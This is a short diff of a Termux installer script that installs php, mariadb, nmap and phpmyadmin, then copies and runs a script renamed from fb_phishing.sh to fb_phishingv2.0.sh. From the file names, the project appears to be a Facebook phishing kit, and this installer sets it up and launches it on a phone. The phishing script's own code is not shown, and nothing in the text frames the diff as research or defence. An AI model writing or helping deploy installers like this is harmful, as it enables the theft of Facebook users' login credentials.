@@ -17,12 +17,12 @@ apt upgrade -y
 apt install figlet php mariadb nmap phpmyadmin -y
 
 ls
-chmod 777 fb_phishing.sh
+chmod 777 fb_phishingv2.0.sh
 ls
-cp -r fb_phishing.sh /data/data/com.termux/files/usr/bin
+cp -r fb_phishingv2.0.sh /data/data/com.termux/files/usr/bin
 
 
 mv config.inc2.php $PREFIX/share/phpmyadmin/config.inc.php
 
 clear
-bash fb_phishing.sh
+bash fb_phishingv2.0.sh
